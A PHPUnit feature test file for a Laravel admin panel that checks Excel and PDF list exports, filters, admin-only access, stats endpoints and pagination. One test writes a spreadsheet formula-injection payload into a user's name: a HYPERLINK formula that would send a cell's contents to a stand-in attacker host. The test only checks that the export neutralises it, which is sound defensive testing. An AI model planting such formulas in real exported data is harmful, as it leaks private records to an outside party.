<?php

namespace Tests\Feature\Admin;

use App\Models\Feedback;
use App\Models\Payment;
use App\Models\PaymentHold;
use App\Models\Subscription;
use App\Models\SubscriptionInvoice;
use App\Models\SubscriptionPlan;
use App\Models\SupportRequest;
use App\Models\Transfer;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use OpenSpout\Reader\XLSX\Reader;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * Every admin list downloads as Excel and PDF, with the page's filters.
 */
class ListExportTest extends TestCase
{
    use RefreshDatabase;

    private User $admin;

    protected function setUp(): void
    {
        parent::setUp();

        $this->admin = User::factory()->create(['role' => 'admin']);
        $this->seedEveryList();
    }

    private function seedEveryList(): void
    {
        $user = User::factory()->create(['full_name' => 'Export Person']);
        $payment = Payment::factory()->create(['user_id' => $user->id, 'amount' => 25]);
        $hold = PaymentHold::factory()->create(['user_id' => $user->id, 'payment_id' => $payment->id, 'title' => 'Vacation']);
        Transfer::factory()->create(['user_id' => $user->id, 'hold_id' => $hold->id]);
        Feedback::factory()->create(['user_id' => $user->id]);
        SupportRequest::factory()->create(['user_id' => $user->id]);
        $plan = SubscriptionPlan::factory()->create(['name' => 'Premium Monthly']);
        $subscription = Subscription::factory()->create(['user_id' => $user->id, 'subscription_plan_id' => $plan->id]);
        SubscriptionInvoice::factory()->create(['user_id' => $user->id, 'subscription_id' => $subscription->id]);
    }

    /**
     * @return array<string, array{0: string, 1: string}>
     */
    public static function lists(): array
    {
        return [
            'users' => ['users', 'User ID'],
            'payment holds' => ['payment-holds', 'Hold ID'],
            'payments' => ['payments', 'Payment ID'],
            'transfers' => ['transfers', 'Transfer ID'],
            'feedback' => ['feedback', 'Rating'],
            'support' => ['support', 'Subject'],
            'subscriptions' => ['subscriptions', 'Plan'],
            'subscription plans' => ['subscription-plans', 'Active subscribers'],
            'subscription payments' => ['subscription-payments', 'Paid at'],
        ];
    }

    /**
     * @return array<int, array<int, mixed>>
     */
    private function xlsxRows($response): array
    {
        $reader = new Reader;
        $reader->open($response->baseResponse->getFile()->getPathname());

        $rows = [];
        foreach ($reader->getSheetIterator() as $sheet) {
            foreach ($sheet->getRowIterator() as $row) {
                $rows[] = $row->toArray();
            }
        }
        $reader->close();

        return $rows;
    }

    #[DataProvider('lists')]
    public function test_the_list_downloads_as_excel(string $list, string $heading): void
    {
        $response = $this->actingAs($this->admin)->get("/admin/{$list}/export?format=xlsx");

        $response->assertOk()
            ->assertHeader('content-type', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
        $this->assertMatchesRegularExpression('/attachment; filename=time-vault-.+\.xlsx/', $response->headers->get('content-disposition'));

        $rows = $this->xlsxRows($response);
        $this->assertContains($heading, $rows[0], 'Heading row');
        $this->assertGreaterThanOrEqual(2, count($rows), 'At least one data row');
    }

    public function test_text_that_looks_like_a_formula_is_exported_as_plain_text(): void
    {
        $payload = '=HYPERLINK("https://evil.example/?d="&C2,"Open")';
        User::factory()->create(['full_name' => $payload]);

        $response = $this->actingAs($this->admin)->get('/admin/users/export?format=xlsx')->assertOk();

        $zip = new \ZipArchive;
        $zip->open($response->baseResponse->getFile()->getPathname());
        $sheet = $zip->getFromName('xl/worksheets/sheet1.xml');
        $zip->close();

        $this->assertStringNotContainsString('<f>', $sheet, 'No cell may be written as a formula');
        $this->assertContains($payload, array_merge(...$this->xlsxRows($response)));
    }

    #[DataProvider('lists')]
    public function test_the_list_downloads_as_pdf(string $list): void
    {
        $response = $this->actingAs($this->admin)->get("/admin/{$list}/export?format=pdf");

        $response->assertOk()->assertHeader('content-type', 'application/pdf');
        $this->assertStringStartsWith('%PDF', $response->getContent());
    }

    #[DataProvider('lists')]
    public function test_the_list_page_shows_the_download_buttons(string $list): void
    {
        $this->actingAs($this->admin)->get("/admin/{$list}")
            ->assertOk()
            ->assertSee(route("admin.{$list}.export", ['format' => 'xlsx']), false)
            ->assertSee(route("admin.{$list}.export", ['format' => 'pdf']), false);
    }

    public function test_the_download_keeps_the_pages_filters(): void
    {
        Payment::factory()->create(['status' => 'failed', 'failure_reason' => 'Card declined']);

        $rows = $this->xlsxRows($this->actingAs($this->admin)->get('/admin/payments/export?format=xlsx&status=failed'));

        $this->assertCount(2, $rows); // heading + the one failed payment
        $this->assertSame('Card declined', $rows[1][7]);

        $this->actingAs($this->admin)->get('/admin/payments?status=failed')
            ->assertSee(route('admin.payments.export', ['status' => 'failed', 'format' => 'xlsx']));
    }

    public function test_an_unknown_format_falls_back_to_excel(): void
    {
        $this->actingAs($this->admin)->get('/admin/users/export?format=exe')
            ->assertOk()
            ->assertHeader('content-type', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
    }

    public function test_exports_are_admin_only(): void
    {
        $user = User::factory()->create();

        foreach (array_column(self::lists(), 0) as $list) {
            $this->actingAs($user)->get("/admin/{$list}/export?format=xlsx")->assertRedirect(route('admin.login'));
        }
    }

    // ── Auto refresh + pagination ────────────────────────────────────────────

    public function test_the_new_stats_endpoints_report_changes(): void
    {
        $before = $this->actingAs($this->admin)->getJson('/admin/feedback/stats')->assertOk()->json();
        Feedback::factory()->create();
        $after = $this->actingAs($this->admin)->getJson('/admin/feedback/stats')->json();
        $this->assertNotSame($before, $after);

        $this->actingAs($this->admin)->getJson('/admin/support/stats')->assertOk()->assertJsonStructure(['total', 'latest_id']);
        $this->actingAs($this->admin)->getJson('/admin/subscription-plans/stats')->assertOk()->assertJsonStructure(['total', 'subscribers']);
        $this->actingAs($this->admin)->getJson('/admin/subscription-payments/stats')->assertOk()
            ->assertJsonPath('total', 1)
            ->assertJsonPath('revenue.USD', 4.99);
    }

    public function test_the_plans_list_is_paginated(): void
    {
        SubscriptionPlan::factory()->count(16)->create();

        $response = $this->actingAs($this->admin)->get('/admin/subscription-plans');

        $this->assertSame(15, $response->viewData('plans')->count());
        $this->assertSame(17, $response->viewData('plans')->total());
        $this->actingAs($this->admin)->get('/admin/subscription-plans?page=2')->assertOk();
    }
}
